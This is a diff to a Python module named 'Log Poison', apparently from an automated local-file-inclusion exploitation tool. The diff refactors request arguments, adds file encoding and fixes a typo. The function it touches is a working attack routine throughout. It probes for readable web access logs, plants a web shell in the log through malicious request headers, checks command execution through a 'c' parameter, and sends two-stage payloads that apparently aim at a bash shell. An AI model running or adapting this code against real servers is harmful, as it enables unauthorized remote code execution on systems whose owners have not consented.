@@ -1,10 +1,12 @@
+"""Log Poison"""
+import os
+
 from src.utils.arguments import args
 from src.httpreqs import request
 from src.configs import config
 from src.utils.args_check import scriptDirectory
-import os
 from src.utils import colors
-from src.configs import config
+from src.utils.info import printInfo
 
 
 def exploit_log_poison(
@@ -32,7 +34,11 @@ def exploit_log_poison(
         )
         return
 
-    with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r") as f:
+    with open(
+        scriptDirectory + os.sep + "src/wordlists/http_access_log.txt",
+        "r",
+        encoding="latin1",
+    ) as f:
         lines = f.readlines()
         for line in lines:
             line = line.replace("\n", "")
@@ -55,7 +61,7 @@ def exploit_log_poison(
             if args.httpheaders["User-Agent"] in res.text:
                 # Upload web shell inside log
                 res, _ = request.REQUEST(
-                    u, maliciousHeaders, config.proxies, "", "", exploit=True
+                    u, maliciousHeaders, "", config.proxies, "", "", exploit=True
                 )
 
                 if "?" in exploitUrl:
@@ -64,10 +70,17 @@ def exploit_log_poison(
                     exploitUrl = u + "?c=" + testPayload
 
                 res, _ = request.REQUEST(
-                    exploitUrl, args.httpheaders, config.proxies, "", "", exploit=True
+                    exploitUrl,
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
                 )
+
                 if testString in res.text:
-                    printInfo(ip, port, "bash", "access log posioning")
+                    printInfo(ip, port, "bash", "access log poisoning")
 
                     if args.postreq:
                         # Stage 1
@@ -86,8 +99,8 @@ def exploit_log_poison(
                             # Stage 2
                             request.REQUEST(
                                 url,
-                                exploitPost,
                                 args.httpheaders,
+                                exploitPost,
                                 config.proxies,
                                 "",
                                 "",
@@ -96,27 +109,28 @@ def exploit_log_poison(
                             exploitPost = u + "&c=" + payloadStageTwo
                         return True
 
-                    else:
-                        # Stage 1
-                        exploitUrl = u + "&c=" + payloadStageOne
+                    # Stage 1
+                    exploitUrl = u + "&c=" + payloadStageOne
+                    request.REQUEST(
+                        exploitUrl,
+                        args.httpheaders,
+                        "",
+                        config.proxies,
+                        "",
+                        "",
+                        exploit=True,
+                    )
+
+                    if payloadStageTwo != "":
+                        # Stage 2
+                        exploitUrl = u + "&c=" + payloadStageTwo
                         request.REQUEST(
                             exploitUrl,
                             args.httpheaders,
+                            "",
                             config.proxies,
                             "",
                             "",
                             exploit=True,
                         )
-
-                        if payloadStageTwo != "":
-                            # Stage 2
-                            exploitUrl = u + "&c=" + payloadStageTwo
-                            request.REQUEST(
-                                exploitUrl,
-                                args.httpheaders,
-                                config.proxies,
-                                "",
-                                "",
-                                exploit=True,
-                            )
-                        return True
+                    return True
